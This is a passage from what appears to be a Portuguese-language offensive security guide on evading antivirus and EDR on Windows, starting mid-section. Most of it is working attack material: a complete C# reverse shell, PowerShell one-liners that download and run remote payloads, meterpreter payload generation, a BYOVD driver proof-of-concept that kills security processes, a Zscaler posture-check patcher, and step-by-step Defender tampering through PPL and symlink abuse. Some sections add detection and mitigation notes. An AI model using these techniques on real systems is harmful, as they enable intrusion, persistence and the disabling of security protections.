Envolve **criar um novo processo sacrificial**, injetar seu código malicioso de post-exploitation nesse novo processo, executar o código e, quando terminar, encerrar o novo processo. Isso tem vantagens e desvantagens. A vantagem do método fork and run é que a execução ocorre **fora** do nosso processo Beacon implant. Isso significa que, se algo nas nossas ações de post-exploitation der errado ou for detectado, há uma **chance muito maior** do nosso **implant sobreviver.** A desvantagem é que você tem uma **maior chance** de ser detectado por **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Trata-se de injetar o código malicioso de post-exploitation **no próprio processo**. Desta forma, você evita criar um novo processo e ser escaneado pelo AV, mas a desvantagem é que, se algo der errado na execução do seu payload, há uma **chance muito maior** de **perder seu beacon**, pois ele pode travar.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Se quiser ler mais sobre carregamento de C# Assembly, confira este artigo [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) e o InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Você também pode carregar C# Assemblies **from PowerShell**, confira [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) e o vídeo do S3cur3th1sSh1t (https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Como proposto em [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), é possível executar código malicioso usando outras linguagens dando à máquina comprometida acesso **ao ambiente do interpretador instalado no Attacker Controlled SMB share**.

Ao permitir acesso aos Interpreter Binaries e ao ambiente no SMB share, você pode **executar código arbitrário nessas linguagens na memória** da máquina comprometida.

O repositório indica: Defender ainda escaneia os scripts, mas ao utilizar Go, Java, PHP etc temos **more flexibility to bypass static signatures**. Testes com scripts de reverse shell aleatórios não ofuscados nessas linguagens se mostraram bem-sucedidos.

## TokenStomping

Token stomping é uma técnica que permite a um atacante **manipular o access token ou um produto de segurança como um EDR ou AV**, permitindo reduzir seus privilégios de modo que o processo não morra, mas não tenha permissões para verificar atividades maliciosas.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Como descrito em [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), é fácil apenas instalar o Chrome Remote Desktop no PC da vítima e então usá-lo para takeover e manter persistência:
1. Faça o download em https://remotedesktop.google.com/, clique em "Set up via SSH", e então clique no arquivo MSI para Windows para baixar o MSI.
2. Execute o instalador silenciosamente na vítima (administrador requerido): `msiexec /i chromeremotedesktophost.msi /qn`
3. Volte à página do Chrome Remote Desktop e clique em next. O assistente pedirá autorização; clique no botão Authorize para continuar.
4. Execute o parâmetro fornecido com alguns ajustes: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Note o parâmetro pin que permite definir o PIN without using the GUI).


## Advanced Evasion

Evasion é um tópico muito complicado; às vezes você precisa levar em conta muitas fontes diferentes de telemetria em um único sistema, então é praticamente impossível permanecer completamente indetectável em ambientes maduros.

Cada ambiente que você enfrentar terá seus próprios pontos fortes e fracos.

Recomendo fortemente que assista a esta palestra do [@ATTL4S](https://twitter.com/DaniLJ94), para obter uma base em técnicas mais avançadas de Evasion.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Esta é também outra ótima palestra do [@mariuszbit](https://twitter.com/mariuszbit) sobre Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Você pode usar [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) que irá **remover partes do binário** até descobrir **qual parte o Defender** considera maliciosa e separá-la para você.\
Outra ferramenta que faz **a mesma coisa é** [**avred**](https://github.com/dobin/avred) com um web aberto oferecendo o serviço em [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Até o Windows10, todas as versões do Windows vinham com um **Telnet server** que você podia instalar (como administrador) fazendo:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Faça com que ele **inicie** quando o sistema for iniciado e **execute**-o agora:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Alterar porta do telnet** (stealth) e desabilitar firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Faça o download em: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (você quer os bin downloads, não o setup)

**ON THE HOST**: Execute _**winvnc.exe**_ e configure o servidor:

- Habilite a opção _Disable TrayIcon_
- Defina uma senha em _VNC Password_
- Defina uma senha em _View-Only Password_

Em seguida, mova o binário _**winvnc.exe**_ e o arquivo **recém-criado** _**UltraVNC.ini**_ para dentro da **victim**

#### **Reverse connection**

O **attacker** deve **executar dentro** do seu **host** o binário `vncviewer.exe -listen 5900` para que fique **preparado** para capturar uma reverse **VNC connection**. Em seguida, dentro da **victim**: inicie o daemon winvnc `winvnc.exe -run` e execute `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**WARNING:** Para manter o stealth, você deve evitar as seguintes ações

- Não inicie `winvnc` se ele já estiver em execução ou você acionará um [popup](https://i.imgur.com/1SROTTl.png). Verifique se está em execução com `tasklist | findstr winvnc`
- Não inicie `winvnc` sem `UltraVNC.ini` no mesmo diretório ou isso fará com que a [config window](https://i.imgur.com/rfMQWcf.png) seja aberta
- Não execute `winvnc -h` para ajuda ou você acionará um [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Faça o download em: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Dentro do GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Agora **inicie o lister** com `msfconsole -r file.rc` e **execute** o **payload XML** com:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**O Defender atual encerrará o processo muito rapidamente.**

### Compilando nosso próprio reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Primeiro C# Revershell

Compile-o com:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Use-o com:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# using compilador
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Download e execução automática:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Lista de obfuscadores para C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Usando python como exemplo para construir injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Outras ferramentas
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### More

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Killing AV/EDR From Kernel Space

Storm-2603 aproveitou um pequeno utilitário de console conhecido como **Antivirus Terminator** para desativar proteções endpoint antes de entregar ransomware. A ferramenta traz seu **próprio driver vulnerável mas *assinado*** e o abusa para emitir operações privilegiadas no kernel que nem mesmo serviços AV Protected-Process-Light (PPL) conseguem bloquear.

Principais pontos
1. **Driver assinado**: O arquivo entregue em disco é `ServiceMouse.sys`, mas o binário é o driver legitimamente assinado `AToolsKrnl64.sys` do “System In-Depth Analysis Toolkit” da Antiy Labs. Como o driver possui uma assinatura válida da Microsoft, ele é carregado mesmo quando Driver-Signature-Enforcement (DSE) está habilitado.
2. **Instalação do serviço**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
A primeira linha registra o driver como um **serviço kernel** e a segunda o inicia para que `\\.\ServiceMouse` passe a ser acessível desde o user land.
3. **IOCTLs expostos pelo driver**
| IOCTL code | Capacidade                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Encerrar um processo arbitrário pelo PID (usado para matar serviços Defender/EDR) |
| `0x990000D0` | Excluir um arquivo arbitrário no disco |
| `0x990001D0` | Descarregar o driver e remover o serviço |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Por que funciona**: O BYOVD ignora completamente as proteções em user-mode; código que executa no kernel pode abrir processos *protegidos*, terminá-los ou manipular objetos do kernel independentemente de PPL/PP, ELAM ou outras funcionalidades de hardening.

Detecção / Mitigação
•  Ative a lista de bloqueio de drivers vulneráveis da Microsoft (`HVCI`, `Smart App Control`) para que o Windows recuse carregar `AToolsKrnl64.sys`.  
•  Monitore a criação de novos serviços *kernel* e alerte quando um driver for carregado a partir de um diretório world-writable ou não estiver na allow-list.  
•  Observe handles em user-mode para objetos de dispositivo customizados seguidos de chamadas suspeitas a `DeviceIoControl`.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

O **Client Connector** da Zscaler aplica regras de device-posture localmente e depende de Windows RPC para comunicar os resultados a outros componentes. Duas escolhas de design fracas tornam um bypass completo possível:

1. A avaliação de posture acontece **inteiramente no cliente** (um booleano é enviado ao servidor).  
2. Endpoints RPC internos apenas validam que o executável conectando está **assinado pela Zscaler** (via `WinVerifyTrust`).

Ao **patchar quatro binários assinados no disco** ambos os mecanismos podem ser neutralizados:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Sempre retorna `1`, fazendo com que toda checagem seja considerada conforme |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ qualquer processo (mesmo unsigned) pode ligar-se às pipes RPC |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Substituído por `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity checks on the tunnel | Contornado |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Após substituir os arquivos originais e reiniciar a stack de serviços:

* **Todas** as verificações de postura exibem **verde/conforme**.
* Binários não assinados ou modificados podem abrir os named-pipe RPC endpoints (e.g. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* O host comprometido ganha acesso irrestrito à rede interna definida pelas políticas do Zscaler.

Este estudo de caso demonstra como decisões de confiança puramente do lado do cliente e verificações simples de assinatura podem ser derrotadas com alguns patches de bytes.

## Abusing Protected Process Light (PPL) To Tamper AV/EDR With LOLBINs

Protected Process Light (PPL) aplica uma hierarquia de assinante/nível de modo que somente processos protegidos de nível igual ou superior possam manipular uns aos outros. Ofensivamente, se você puder iniciar legitimamente um binário habilitado para PPL e controlar seus argumentos, pode converter funcionalidades benignas (por exemplo, registro) em um primitivo de escrita restrito, suportado por PPL, contra diretórios protegidos usados por AV/EDR.

What makes a process run as PPL
- The target EXE (and any loaded DLLs) must be signed with a PPL-capable EKU.
- The process must be created with CreateProcess using the flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- A compatible protection level must be requested that matches the signer of the binary (e.g., `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` for anti-malware signers, `PROTECTION_LEVEL_WINDOWS` for Windows signers). Wrong levels will fail at creation.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (selects protection level and forwards arguments to the target EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Usage pattern:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
Primitiva LOLBIN: ClipUp.exe
- O binário de sistema assinado `C:\Windows\System32\ClipUp.exe` auto-inicia e aceita um parâmetro para gravar um arquivo de log em um caminho especificado pelo chamador.
- Quando iniciado como um processo PPL, a gravação do arquivo ocorre com proteção PPL.
- ClipUp não consegue analisar caminhos que contenham espaços; use caminhos curtos 8.3 para apontar para locais normalmente protegidos.

8.3 short path helpers
- Liste nomes curtos: `dir /x` em cada diretório pai.
- Obtenha o caminho curto no cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Cadeia de abuso (abstrata)
1) Execute a LOLBIN com suporte a PPL (ClipUp) com `CREATE_PROTECTED_PROCESS` usando um lançador (por exemplo, CreateProcessAsPPL).
2) Passe o argumento de caminho de log do ClipUp para forçar a criação de um arquivo em um diretório AV protegido (por exemplo, Defender Platform). Use nomes curtos 8.3 se necessário.
3) Se o binário alvo normalmente estiver aberto/trancado pelo AV enquanto roda (por exemplo, MsMpEng.exe), agende a gravação na inicialização antes do AV iniciar instalando um serviço de inicialização automática que execute mais cedo de forma confiável. Valide a ordem de inicialização com Process Monitor (boot logging).
4) Na reinicialização a gravação com proteção PPL ocorre antes do AV travar seus binários, corrompendo o arquivo alvo e impedindo a inicialização.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notas e restrições
- Você não pode controlar o conteúdo que o ClipUp grava além da localização; o primitivo é mais adequado para corrupção do que para injeção precisa de conteúdo.
- Requer privilégios de administrador local/SYSTEM para instalar/iniciar um serviço e uma janela de reinicialização.
- O timing é crítico: o alvo não deve estar aberto; execução na inicialização evita bloqueios de arquivos.

Detections
- Criação de processo de `ClipUp.exe` com argumentos incomuns, especialmente com processo pai sendo lançadores não padrão, durante a inicialização.
- Novos serviços configurados para auto-start de binários suspeitos e que iniciam consistentemente antes do Defender/AV. Investigue criação/modificação de serviços antes de falhas de inicialização do Defender.
- Monitoramento de integridade de arquivos em binários do Defender/diretórios Platform; criações/modificações inesperadas de arquivos por processos com flags de protected-process.
- Telemetria ETW/EDR: procure por processos criados com `CREATE_PROTECTED_PROCESS` e uso anômalo de níveis PPL por binários não-AV.

Mitigations
- WDAC/Code Integrity: restrinja quais binários assinados podem rodar como PPL e sob quais processos pai; bloqueie invocação do ClipUp fora de contextos legítimos.
- Higiene de serviços: restrinja criação/modificação de serviços com auto-start e monitore manipulação da ordem de inicialização.
- Garanta que tamper protection e proteções de early-launch do Defender estejam habilitadas; investigue erros de inicialização que indiquem corrupção de binários.
- Considere desabilitar a geração de nomes curtos 8.3 em volumes que hospedam ferramentas de segurança, se compatível com seu ambiente (testar exaustivamente).

References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender escolhe a plataforma de onde roda enumerando subpastas em:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Ele seleciona a subpasta com a maior string de versão lexicográfica (ex., `4.18.25070.5-0`), então inicia os processos do serviço Defender a partir daí (atualizando caminhos de serviço/registro conforme). Essa seleção confia em entradas de diretório incluindo directory reparse points (symlinks). Um administrador pode explorar isso para redirecionar o Defender para um caminho gravável pelo atacante e alcançar DLL sideloading ou interrupção do serviço.

Preconditions
- Administrador local (necessário para criar diretórios/symlinks sob a pasta Platform)
- Capacidade de reiniciar ou acionar re-seleção da plataforma do Defender (reinício do serviço na inicialização)
- Apenas ferramentas integradas necessárias (mklink)

Why it works
- O Defender bloqueia gravações em suas próprias pastas, mas a seleção da plataforma confia em entradas de diretório e escolhe a versão lexicograficamente mais alta sem validar que o destino resolva para um caminho protegido/confiável.

Step-by-step (example)
1) Prepare a writable clone of the current platform folder, e.g. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Crie um symlink de diretório com versão superior dentro de Platform apontando para sua pasta:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Trigger selection (recomenda-se reiniciar):
```cmd
shutdown /r /t 0
```
4) Verifique que MsMpEng.exe (WinDefend) está sendo executado a partir do caminho redirecionado:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Você deve observar o novo caminho do processo em `C:\TMP\AV\` e a configuração do serviço/registro refletindo essa localização.

Opções de pós-exploração
- DLL sideloading/code execution: Drop/replace DLLs que o Defender carrega do seu diretório de aplicação para executar código nos processos do Defender. Veja a seção acima: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Remova o version-symlink para que, na próxima inicialização, o caminho configurado não seja resolvido e o Defender falhe ao iniciar:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Observe que esta técnica não fornece escalonamento de privilégios por si só; requer direitos de administrador.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams podem mover a evasão em tempo de execução para fora do implant C2 e para dentro do próprio módulo alvo hookando sua Import Address Table (IAT) e roteando APIs selecionadas através de código position‑independent controlado pelo atacante (PIC). Isso generaliza a evasão além da pequena superfície de APIs que muitos kits expõem (e.g., CreateProcessA), e estende as mesmas proteções a BOFs e post‑exploitation DLLs.

High-level approach
- Stage a PIC blob alongside the target module using a reflective loader (prepended or companion). The PIC must be self‑contained and position‑independent.
- As the host DLL loads, walk its IMAGE_IMPORT_DESCRIPTOR and patch the IAT entries for targeted imports (e.g., CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) to point at thin PIC wrappers.
- Each PIC wrapper executes evasions before tail‑calling the real API address. Typical evasions include:
- Memory mask/unmask around the call (e.g., encrypt beacon regions, RWX→RX, change page names/permissions) then restore post‑call.
- Call‑stack spoofing: construct a benign stack and transition into the target API so call‑stack analysis resolves to expected frames.
- For compatibility, export an interface so an Aggressor script (or equivalent) can register which APIs to hook for Beacon, BOFs and post‑ex DLLs.

Why IAT hooking here
- Works for any code that uses the hooked import, without modifying tool code or relying on Beacon to proxy specific APIs.
- Covers post‑ex DLLs: hooking LoadLibrary* lets you intercept module loads (e.g., System.Management.Automation.dll, clr.dll) and apply the same masking/stack evasion to their API calls.
- Restores reliable use of process‑spawning post‑ex commands against call‑stack–based detections by wrapping CreateProcessA/W.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notes
- Aplique o patch após relocations/ASLR e antes do primeiro uso da importação. Reflective loaders como TitanLdr/AceLdr demonstram hooking durante o DllMain do módulo carregado.
- Mantenha wrappers tiny e PIC-safe; resolva a verdadeira API via o valor original da IAT que você capturou antes do patch ou via LdrGetProcedureAddress.
- Use transições RW → RX para PIC e evite deixar páginas writable+executable.

Call‑stack spoofing stub
- Draugr‑style PIC stubs constroem uma cadeia de chamadas falsa (endereços de retorno em módulos benignos) e então pivoteiam para a API real.
- Isso derrota detecções que esperam pilhas canônicas do Beacon/BOFs para APIs sensíveis.
- Combine com técnicas de stack cutting/stack stitching para aterrissar dentro dos frames esperados antes do API prologue.

Operational integration
- Prepend o reflective loader aos DLLs post‑ex para que o PIC e os hooks se inicializem automaticamente quando o DLL for carregado.
- Use um Aggressor script para registrar as target APIs de modo que Beacon e BOFs se beneficiem, de forma transparente, do mesmo caminho de evasão sem alterações de código.

Detection/DFIR considerations
- IAT integrity: entradas que resolvem para endereços non‑image (heap/anon); verificação periódica dos import pointers.
- Stack anomalies: endereços de retorno que não pertencem a imagens carregadas; transições abruptas para PIC non‑image; ancestralidade inconsistente de RtlUserThreadStart.
- Loader telemetry: escritas in‑process na IAT, atividade precoce no DllMain que modifica import thunks, regiões RX inesperadas criadas no load.
- Image‑load evasion: se hooking LoadLibrary*, monitore carregamentos suspeitos de automation/clr assemblies correlacionados com eventos de memory masking.

Related building blocks and examples
- Reflective loaders que realizam IAT patching durante o carregamento (e.g., TitanLdr, AceLdr)
- Memory masking hooks (e.g., simplehook) e stack‑cutting PIC (stackcutting)
- PIC call‑stack spoofing stubs (e.g., Draugr)

## SantaStealer Tradecraft for Fileless Evasion and Credential Theft

SantaStealer (aka BluelineStealer) ilustra como modernos info-stealers combinam AV bypass, anti-analysis e credential access em um único workflow.

### Keyboard layout gating & sandbox delay

- Uma config flag (`anti_cis`) enumera os layouts de teclado instalados via `GetKeyboardLayoutList`. Se um layout cirílico for encontrado, a amostra registra um marcador vazio `CIS` e termina antes de executar os stealers, garantindo que nunca detone em localidades excluídas enquanto deixa um artefato para hunting.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Lógica em camadas `check_antivm`

- Variante A percorre a lista de processos, calcula um hash de cada nome com um checksum rolling personalizado e compara contra blocklists embutidas para debuggers/sandboxes; repete o checksum sobre o nome do computador e verifica diretórios de trabalho como `C:\analysis`.
- Variante B inspeciona propriedades do sistema (limiar de contagem de processos, uptime recente), chama `OpenServiceA("VBoxGuest")` para detectar adições do VirtualBox, e realiza checagens de temporização em torno de sleeps para identificar single-stepping. Qualquer detecção aborta antes do lançamento dos módulos.

### Helper fileless + reflective loading duplo ChaCha20

- A DLL/EXE principal embute um Chromium credential helper que é ou dropado para o disco ou mapeado manualmente na memória; o modo fileless resolve imports/relocations por conta própria, de modo que nenhum artefato do helper é escrito.
- Esse helper armazena uma DLL de segunda fase criptografada duas vezes com ChaCha20 (duas chaves de 32 bytes + nonces de 12 bytes). Após ambas as passagens, ele reflectively loads o blob (sem `LoadLibrary`) e chama as exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` derivadas de [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).
